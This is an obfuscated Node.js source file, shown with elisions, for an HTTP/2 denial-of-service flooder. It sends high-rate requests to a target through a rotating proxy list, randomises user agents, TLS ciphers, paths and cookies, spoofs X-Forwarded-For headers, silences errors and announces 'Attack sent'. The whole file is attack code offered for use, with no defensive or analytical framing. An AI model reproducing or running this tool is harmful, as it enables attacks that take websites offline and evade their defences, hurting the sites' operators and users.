process.on('uncaughtException', function (_0x1d456c) {})
process.on('unhandledRejection', function (_0xbce86b) {})
...
var proxies = fs
    .readFileSync(process.argv[6], 'utf-8')
    .toString()
    .replace(/\r/g, '')
    .split('\n'),
  rate = process.argv[7],
...
process.argv.forEach((_0xf4f9a1) => {
  if (
    _0xf4f9a1.includes('cookie=') &&
    !process.argv[5].split('""')[0].includes(_0xf4f9a1)
  ) {
    COOKIES = _0xf4f9a1.slice(7)
  } else {
    if (
      _0xf4f9a1.includes('postdata=') &&
      !process.argv[5].split('""')[0].includes(_0xf4f9a1)
    ) {
      process.argv[5].toUpperCase() != 'POST' &&
        (console.error('Method Invalid (Has Postdata But Not POST Method)'),
        process.exit(1))
      POSTDATA = _0xf4f9a1.slice(9)
    } else {
      if (_0xf4f9a1.includes('randomstring=')) {
        randomparam = _0xf4f9a1.slice(13)
        console.log('[Info] RandomString Mode Enabled.')
      } else {
        if (_0xf4f9a1.includes('headerdata=')) {
          headerbuilders = {
            accept:
            ...
            'sec-ch-ua':
              'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
            'sec-ch-ua-mobile': '?0',
          ...
          if (_0xf4f9a1.slice(11).split('""')[0].includes('&')) {
            const _0x1834de = _0xf4f9a1.slice(11).split('""')[0].split('&')
            for (let _0xee7b89 = 0; _0xee7b89 < _0x1834de.length; _0xee7b89++) {
              const _0x5948cf = _0x1834de[_0xee7b89].split('=')[0],
                _0x25c02d = _0x1834de[_0xee7b89].split('=')[1]
              headerbuilders[_0x5948cf] = _0x25c02d
            }
          } else {
            const _0x348167 = _0xf4f9a1.slice(11).split('""')[0],
              _0x5d6d40 = _0x348167.split('=')[0],
              _0x1e28f5 = _0x348167.split('=')[1]
            headerbuilders[_0x5d6d40] = _0x1e28f5
          }
        }
      }
    }
...
if (headerbuilders !== undefined) {
  ...
  if (cluster.isMaster) {
    ...
    console.log('\x1B[32m Attack sent')
    setTimeout(() => {
      process.exit(1)
    }, process.argv[3] * 1000)
  } else {
...
function ra() {
  const _0x44afe4 = randstr.generate({
    charset:
...
function startflood() {
  if (process.argv[5].toUpperCase() == 'POST') {
    const _0x261211 = url.parse(target).path.replace('%RAND%', ra())
    ...
    randomparam
      ? setInterval(() => {
          ...
          var _0xbc4a4e = cplist[Math.floor(Math.random() * cplist.length)],
            _0x295352 = proxies[Math.floor(Math.random() * proxies.length)]
          _0x295352 = _0x295352.split(':')
          var _0x263682 = require('http'),
            _0x177e6a = require('tls')
          _0x177e6a.DEFAULT_MAX_VERSION = 'TLSv1.3'
          var _0x526418 = _0x263682.request(
            {
              host: _0x295352[0],
              port: _0x295352[1],
              ciphers: _0xbc4a4e,
          ...
          _0x526418.on('connect', function (_0x222656, _0x564c31, _0x20238e) {
            const _0x167fb3 = http2.connect(parsed.href, {
              createConnection: () =>
                _0x177e6a.connect(
                  {
                    host: parsed.host,
                  ...
                  function () {
                    for (let _0x572bd2 = 0; _0x572bd2 < rate; _0x572bd2++) {
                      headerbuilders[':path'] =
                      ...
                      const _0x24d16d = _0x167fb3.request(headerbuilders)
                      _0x24d16d.end()
                      _0x24d16d.on('response', () => {
                        _0x24d16d.close()
                      })
                    }
                  }
      ...
      : setInterval(() => {
          headerbuilders['User-agent'] =
            UAs[Math.floor(Math.random() * UAs.length)]
          var _0x3c4aac = cplist[Math.floor(Math.random() * cplist.length)],
            _0x558702 = proxies[Math.floor(Math.random() * proxies.length)]
          _0x558702 = _0x558702.split(':')
          var _0x92e0d6 = require('http'),
            _0x5c8dc0 = require('tls')
          _0x5c8dc0.DEFAULT_MAX_VERSION = 'TLSv1.3'
          var _0x45e973 = _0x92e0d6.request(
            {
              host: _0x558702[0],
              port: _0x558702[1],
              ciphers: _0x3c4aac,
          ...
          _0x45e973.on('connect', function (_0x579457, _0x25c0e2, _0x5ae396) {
            const _0x1281c2 = http2.connect(parsed.href, {
              createConnection: () =>
                _0x5c8dc0.connect(
                  {
                    host:
                  ...
                  function () {
                    for (let _0x56a54e = 0; _0x56a54e < rate; _0x56a54e++) {
                      headerbuilders[':path'] =
                        '' + url.parse(target).path.replace('%RAND%', ra())
                      headerbuilders['X-Forwarded-For'] = spoof()
                      headerbuilders.Body =
                        ...
                        (POSTDATA.includes('%RAND%')
                          ...
                          : POSTDATA)
                      headerbuilders.Cookie.replace('%RAND%', ra())
                      const _0x38f12e = _0x1281c2.request(headerbuilders)
                      _0x38f12e.end()
                      _0x38f12e.on('response', () => {
                        _0x38f12e.close()
                      })
                    }
                  }
    ...
    process.argv[5].toUpperCase() == 'GET'
      ? ((headerbuilders[':method'] = 'GET'),
        randomparam
          ? setInterval(() => {
              headerbuilders['User-agent'] =
                UAs[Math.floor(Math.random() * UAs.length)]
              var _0x912936 = cplist[Math.floor(Math.random() * cplist.length)],
                _0x3057fb = proxies[Math.floor(Math.random() * proxies.length)]
              _0x3057fb = _0x3057fb.split(':')
              var _0xbac9ec = require('http'),
                _0x418c24 = require('tls')
              _0x418c24.DEFAULT_MAX_VERSION = 'TLSv1.3'
              var _0x190939 = _0xbac9ec.request(
                {
                  host: _0x3057fb[0],
                  port: _0x3057fb[1],
                  ciphers: _0x912936,
              ...
              _0x190939.on(
                'connect',
                function (_0x323fdf, _0x5e9ce7, _0x3a6483) {
                  const _0x2173cb = http2.connect(parsed.href, {
                    createConnection: () =>
                      _0x418c24.connect(
                        {
                          host: parsed.host,
                        ...
                        function () {
                          for (
                            ...
                            headerbuilders['X-Forwarded-For'] = spoof()
                            headerbuilders.Cookie.replace('%RAND%', ra())
                            const _0x44af51 = _0x2173cb.request(headerbuilders)
                            _0x44af51.end()
                            _0x44af51.on('response', () => {
                              _0x44af51.close()
                            })
                          }
                        }
          ...
          : setInterval(() => {
              headerbuilders['User-agent'] =
                UAs[Math.floor(Math.random() * UAs.length)]
              var _0x5cb6a3 = cplist[Math.floor(Math.random() * cplist.length)],
                _0x2e59a8 = proxies[Math.floor(Math.random() * proxies.length)]
              _0x2e59a8 = _0x2e59a8.split(':')
              var _0x31a71e = require('http'),
                _0x3ed2a0 = require('tls')
              _0x3ed2a0.DEFAULT_MAX_VERSION = 'TLSv1.3'
              var _0x4f1769 = _0x31a71e.request(
                {
                  host: _0x2e59a8[0],
                  port: _0x2e59a8[1],
                  ciphers: _0x5cb6a3,
              ...
              _0x4f1769.on(
                'connect',
                function (_0x4fbe72, _0xbbdfaf, _0x4ae62a) {
                  const _0x44b0f8 = http2.connect(parsed.href, {
                    createConnection: () =>
                      _0x3ed2a0.connect(
                        {
                          host: parsed.host,
                        ...
                        function () {
                          for (
                            ...
                            headerbuilders['X-Forwarded-For'] = spoof()
                            headerbuilders.Cookie.replace('%RAND%', ra())
                            const _0xc7d5d4 = _0x44b0f8.request(headerbuilders)
                            _0xc7d5d4.end()
                            _0xc7d5d4.on('response', () => {
                              _0xc7d5d4.close()
                            })
                          }
                        }
      ...
      : (console.log('[Info] Invalid Method.'), process.exit(1))
  }
}
